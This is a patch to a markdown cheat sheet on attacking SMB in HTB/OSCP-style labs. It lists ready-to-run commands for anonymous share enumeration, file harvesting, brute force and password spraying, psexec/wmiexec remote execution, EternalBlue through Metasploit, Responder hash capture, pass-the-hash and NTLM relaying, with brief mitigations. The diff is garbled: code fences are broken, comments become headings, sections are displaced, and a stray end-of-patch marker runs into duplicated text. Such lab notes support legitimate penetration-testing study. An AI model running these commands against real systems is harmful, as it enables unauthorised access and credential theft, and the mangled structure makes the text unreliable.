@@ -1,20 +1,48 @@
-# SMB Attacks — Methods, Tools & Practical Notes
+#SMB (Canonical)
 
-Short, practical reference for attacking SMB in HTB/OSCP-style labs: enumeration, exploitation, credential capture, relays, and post-exploitation checks.
+## Overview
+
+SMB enumeration and exploitation focuses on shares, users, and weak configurations that allow credential harvesting, code execution, or lateral movement.
+
+## When to test
+
+- When NetBIOS/SMB ports (139/445) are open, and when file shares are accessible.
+
+## Detection Checklist
+
+- Enumerate shares (`smbclient -L //<target> -N`), list files, check for writable shares and exposed credentials.
+
+## Tools
+
+- `smbclient`, `enum4linux`, `crackmapexec`, `smbmap`.
+
+## Payloads / Patterns
+
+- Common checks: anonymous access, readable `credentials` or `config` files, scripts with cleartext passwords.
+
+## Commands / Quick Examples
+
+- `smbclient -L //<target> -N`  
+- `enum4linux -a <target>`  
+- `smbmap -H <target> -u guest -p ''`
+
+## Exploitation Primitives
+
+- Retrieve credentials from files, use writable shares to upload tools, or abuse services running under privileged accounts.
+
+## Mitigations / Notes for Reporting
+
+- Disable anonymous access, enforce least-privilege on shares, and rotate/remove embedded credentials.
+
+## Detailed Notes / Lab Content
+
+The original detailed SMB notes are preserved below for reference and lab examples.
 
 ---
 
-## Quick Overview
+## SMB Attacks — Methods, Tools & Practical Notes
 
-SMB (Server Message Block) is a network file/service protocol commonly used by Windows and sometimes Linux (Samba). SMB attack workflows typically include:
-
-- Share enumeration and access checks (anonymous/guest)
-- File download/upload for credential harvesting or payload staging
-- Administrative shares (C$, ADMIN$) for remote command execution when valid credentials exist
-- Capturing Net-NTLM hashes via forced authentication
-- Relay attacks to pivot or execute commands on other hosts
-- Brute force and password spraying when credentials are weak
-- Exploiting known SMB vulnerabilities (e.g., MS17-010 / EternalBlue)
+Short, practical reference for attacking SMB in HTB/OSCP-style labs: enumeration, exploitation, credential capture, relays, and post-exploitation checks.
 
 ---
 
@@ -28,32 +56,24 @@ Commands / Examples:
 
 ```
 smbmap -H <target>
-```
 
 - Explicit guest login (smbmap):
 
-```
 smbmap -H <target> -u guest -p ""
-```
 
 - smbclient list shares (no auth):
 
-```
 smbclient -L //<target> -N
-```
 
 - Connect to a share (interactive):
 
-```
 smbclient //<target>/Share -N
-# then: get secret.docx
-# or: put file.txt
-```
 
-- crackmapexec (netexec) quick check for guest/anonymous:
+## then: get secret.docx
 
-```
-crackmapexec smb <target> -u '' -p ''
+
+## or: put file.txt
+
 ```
 
 What to check:
@@ -62,6 +82,10 @@ What to check:
 
 ---
 
+- crackmapexec (netexec) quick check for guest/anonymous:
+
+crackmapexec smb <target> -u '' -p ''
+
 ## 2. Recursive Enumeration & File Harvesting
 
 Tools: `smbmap`, `smbclient`, `smbget`, `enum4linux`
@@ -69,14 +93,18 @@ Tools: `smbmap`, `smbclient`, `smbget`, `enum4linux`
 Examples:
 
 ```
-# Recursive listing with smbmap
+
+## Recursive listing with smbmap
+
 smbmap -H <ip> -r SHARE
 
-# Download files with smbclient
+## Download files with smbclient
+
 smbclient //<ip>/Share -U user
 get secret.docx
 
-# Run enum4linux for extended SMB enumerations
+## Run enum4linux for extended SMB enumerations
+
 enum4linux -a <target>
 ```
 
@@ -94,10 +122,13 @@ Tools: `crackmapexec` (`netexec`), `smbclient`, `wmiexec.py` (Impacket), `psexec
 Examples:
 
 ```
-# Execute command using crackmapexec
+
+## Execute command using crackmapexec
+
 crackmapexec smb <target> -u <user> -p <pass> -x "whoami"
 
-# Using impacket's psexec/wmiexec
+## Using impacket's psexec/wmiexec
+
 python3 /usr/share/impacket/examples/psexec.py <domain>/<user>:<pass>@<target>
 python3 /usr/share/impacket/examples/wmiexec.py <user>:<pass>@<target> "whoami"
 ```
@@ -115,10 +146,13 @@ Tools: `crackmapexec`, `hydra`, `ncrack` (or `crackmapexec`'s built-in lists)
 Examples:
 
 ```
-# Brute force single username with password list
+
+## Brute force single username with password list
+
 crackmapexec smb <target> -u Administrator -p /path/passlist.txt
 
-# Password spraying (many users, one password)
+## Password spraying (many users, one password)
+
 crackmapexec smb <target> -u users.txt -p 'Winter2024' --continue-on-success
 ```
 
@@ -135,10 +169,13 @@ Tools: `nmap` (NSE scripts), `Metasploit`, `searchsploit`
 Examples:
 
 ```
-# Detect MS17-010
+
+## Detect MS17-010
+
 nmap --script smb-vuln-ms17-010 -p445 <target>
 
-# Metasploit (concept)
+## Metasploit (concept)
+
 use exploit/windows/smb/ms17_010_eternalblue
 set RHOSTS <target>
 exploit
@@ -157,10 +194,13 @@ Tools: `Responder`, `impacket-smbserver`, `ntlmrelayx` (Impacket)
 Examples:
 
 ```
-# Start Responder to capture hashes
+
+## Start Responder to capture hashes
+
 responder -I eth0
 
-# Host a malicious SMB share with impacket
+## Host a malicious SMB share with impacket
+
 sudo impacket-smbserver share .
 ```
 
@@ -177,10 +217,13 @@ Tools: `crackmapexec`, `impacket-ntlmrelayx.py`
 Examples:
 
 ```
-# Use NTLM hash to authenticate
+
+## Use NTLM hash to authenticate
+
 crackmapexec smb <target> -u Administrator -H <NTLM_hash>
 
-# Relay captured auth to other targets
+## Relay captured auth to other targets
+
 ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
 ```
 
@@ -204,8 +247,6 @@ Notes:
 ---
 
 ## 9. What to Check / Where (Scenario → Action Mapping)
-
-This short mapping helps you decide next steps based on findings during enumeration.
 
 - Finding: **Anonymous share listing / readable files**
   - Action: Recursively list & download; search for creds, keys, configs; check for backup files/credentials.
@@ -233,6 +274,8 @@ This short mapping helps you decide next steps based on findings during enumerat
 
 ---
 
+This short mapping helps you decide next steps based on findings during enumeration.
+
 ## 10. Defensive / Mitigation Notes (Short)
 
 - Disable anonymous SMB access where not required.
@@ -246,27 +289,59 @@ This short mapping helps you decide next steps based on findings during enumerat
 ## Quick Reference Commands
 
 ```
-# List shares anonymously
+
+## List shares anonymously
+
 smbmap -H 10.10.10.10
 smbclient -L //10.10.10.10 -N
 
-# Recursive listing and download
+## Recursive listing and download
+
 smbmap -H 10.10.10.10 -r Share
 smbclient //10.10.10.10/Share -U user
 get secret.docx
 
-# Crackmapexec examples
+## Crackmapexec examples
+
 crackmapexec smb 10.10.10.10 -u Administrator -p /path/passlist.txt
 crackmapexec smb 10.10.10.10 -u '' -p ''
 crackmapexec smb 10.10.10.10 -u Administrator -H <NTLM_hash>
 
-# Responder (capture)
+## Responder (capture)
+
 responder -I eth0
 
-# Relay (impacket)
+## Relay (impacket)
+
 ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
 ```
+
+*** End Patch# SMB Attacks — Methods, Tools & Practical Notes
+
+Short, practical reference for attacking SMB in HTB/OSCP-style labs: enumeration, exploitation, credential capture, relays, and post-exploitation checks.
 
 ---
 
 File created as a concise SMB attack reference for HTB/OSCP labs. Update with lab-specific commands or new tools as you use them.
+
+## Quick Overview
+
+SMB (Server Message Block) is a network file/service protocol commonly used by Windows and sometimes Linux (Samba). SMB attack workflows typically include:
+
+- Share enumeration and access checks (anonymous/guest)
+- File download/upload for credential harvesting or payload staging
+- Administrative shares (C$, ADMIN$) for remote command execution when valid credentials exist
+- Capturing Net-NTLM hashes via forced authentication
+- Relay attacks to pivot or execute commands on other hosts
+- Brute force and password spraying when credentials are weak
+- Exploiting known SMB vulnerabilities (e.g., MS17-010 / EternalBlue)
+
+---
+
+## Merged from archive/canonical/smb.md
+
+
+## SMB (Canonical) (archived)
+
+Archived copy of `notes/canonical/smb.md`. Use `notes/smb.md` as the merged single-file topic.
+
